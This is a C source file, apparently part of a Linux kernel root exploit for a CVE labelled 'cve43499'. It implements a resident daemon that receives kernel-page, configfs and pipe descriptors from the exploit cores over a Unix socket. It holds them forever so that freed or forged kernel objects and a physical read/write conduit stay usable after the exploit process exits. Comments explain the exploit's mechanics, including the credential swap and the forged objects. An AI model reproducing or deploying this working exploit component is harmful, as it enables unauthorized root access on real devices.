#define _GNU_SOURCE

#include "su_daemon.h"

#include <stddef.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

/*
 * The kernel-page reference holder, which belongs to one exploit core.
 *
 * core66 reaches its physical read/write through a page it must keep the
 * kernel from reusing, and the exploit process cannot be the one holding it:
 * that process exits when the attempt ends. So core66/root.c hands the
 * descriptors to this daemon, which is already resident, and it simply never
 * closes them.
 *
 * core612 has no such page -- it swaps the exploit process's own cred and is
 * finished -- and never sends the opcode. Nothing here is reachable on that
 * core, which is why it is separated rather than sitting in the middle of the
 * daemon: the file says whose it is.
 *
 * Both sides of the contract are literals on either side of a socket, so they
 * are written out here in full:
 *
 *   'H'                   the opcode, sent before any request
 *   three descriptors     over SCM_RIGHTS, prefixed by the byte 'P'
 *   'K'                   the acknowledgement this sends back
 *   "cve43499_roothold"   the abstract socket the payload then polls to learn
 *                         that the holder is live (ROOT_HOLD_READY_SOCKET in
 *                         core66/root.c)
 *
 * core515 sends a second opcode once its install is done, for the rest of a
 * successful run's fragile set -- the configfs descriptor whose release would
 * free a forged object and the pipe pair still carrying the physrw conduit:
 *
 *   'h'                   like 'H', but one to eight descriptors, the count
 *                         read off the SCM_RIGHTS header
 *
 * Either opcode may arrive first, so both share the ready socket: whichever
 * lands second finds the name bound, confirms it answers, and holds anyway.
 * What the payload needs to know is that a process which never exits owns the
 * descriptors, not which connection bound the name.
 */

#define HOLD_READY_SOCKET "cve43499_roothold"
#define HOLD_REF_FDS 3U
#define HOLD_REF_FDS_MAX 8U

static int recv_hold_fds(int socket_fd, int fds[HOLD_REF_FDS]) {
  char marker = 0;
  struct iovec iov = {
      .iov_base = &marker,
      .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(int) * HOLD_REF_FDS)];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  memset(control, 0, sizeof(control));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = control;
  msg.msg_controllen = sizeof(control);

  if (recvmsg(socket_fd, &msg, MSG_CMSG_CLOEXEC) != (ssize_t)sizeof(marker) ||
      marker != 'P') {
    return 0;
  }
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS ||
      cmsg->cmsg_len != CMSG_LEN(sizeof(int) * HOLD_REF_FDS)) {
    return 0;
  }
  memcpy(fds, CMSG_DATA(cmsg), sizeof(int) * HOLD_REF_FDS);
  return 1;
}

static int recv_hold_fds_variable(
    int socket_fd, int fds[HOLD_REF_FDS_MAX], size_t *count) {
  char marker = 0;
  struct iovec iov = {
      .iov_base = &marker,
      .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(int) * HOLD_REF_FDS_MAX)];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  memset(control, 0, sizeof(control));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = control;
  msg.msg_controllen = sizeof(control);

  if (recvmsg(socket_fd, &msg, MSG_CMSG_CLOEXEC) != (ssize_t)sizeof(marker) ||
      marker != 'P') {
    return 0;
  }
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  if (!cmsg || cmsg->cmsg_level != SOL_SOCKET ||
      cmsg->cmsg_type != SCM_RIGHTS) {
    return 0;
  }
  size_t bytes = cmsg->cmsg_len - CMSG_LEN(0);
  if (bytes == 0 || bytes % sizeof(int) != 0 ||
      bytes / sizeof(int) > HOLD_REF_FDS_MAX) {
    return 0;
  }
  *count = bytes / sizeof(int);
  memcpy(fds, CMSG_DATA(cmsg), bytes);
  return 1;
}

static int bind_ready_socket(int *listen_fd) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un ready_address;
  memset(&ready_address, 0, sizeof(ready_address));
  ready_address.sun_family = AF_UNIX;
  memcpy(ready_address.sun_path + 1, HOLD_READY_SOCKET,
         sizeof(HOLD_READY_SOCKET) - 1);
  socklen_t ready_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) + sizeof(HOLD_READY_SOCKET));
  if (bind(fd, (struct sockaddr *)&ready_address, ready_length) == 0 &&
      listen(fd, 4) == 0) {
    *listen_fd = fd;
    return 1;
  }
  close(fd);
  /* Bound already, by this daemon's other holder whichever opcode arrived
   * first. The payload polls the same name, so an answering socket is the
   * same guarantee a fresh bind would be. */
  int probe_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (probe_fd < 0) {
    return 0;
  }
  int live = connect(
      probe_fd, (struct sockaddr *)&ready_address, ready_length) == 0;
  close(probe_fd);
  if (live) {
    *listen_fd = -1;
    return 1;
  }
  return 0;
}

static int acknowledge_holder(int conn) {
  char acknowledged = 'K';
  return write_full(conn, &acknowledged, sizeof(acknowledged));
}

static void hold_forever(int conn, int listen_fd) {
  prctl(PR_SET_NAME, "cve43499-roothold", 0, 0, 0);
  close(conn);
  if (listen_fd < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    int probe_fd = accept4(listen_fd, NULL, NULL, SOCK_CLOEXEC);
    if (probe_fd >= 0) {
      close(probe_fd);
    }
  }
}

void su_hold_kernel_references(int conn) {
  int fds[HOLD_REF_FDS] = {-1, -1, -1};
  if (!recv_hold_fds(conn, fds)) {
    return;
  }
  int listen_fd = -1;
  if (!bind_ready_socket(&listen_fd)) {
    return;
  }
  if (!acknowledge_holder(conn)) {
    return;
  }
  hold_forever(conn, listen_fd);
}

void su_hold_exploited_references(int conn) {
  int fds[HOLD_REF_FDS_MAX];
  size_t count = 0;
  if (!recv_hold_fds_variable(conn, fds, &count)) {
    return;
  }
  int listen_fd = -1;
  if (!bind_ready_socket(&listen_fd)) {
    return;
  }
  if (!acknowledge_holder(conn)) {
    return;
  }
  hold_forever(conn, listen_fd);
}
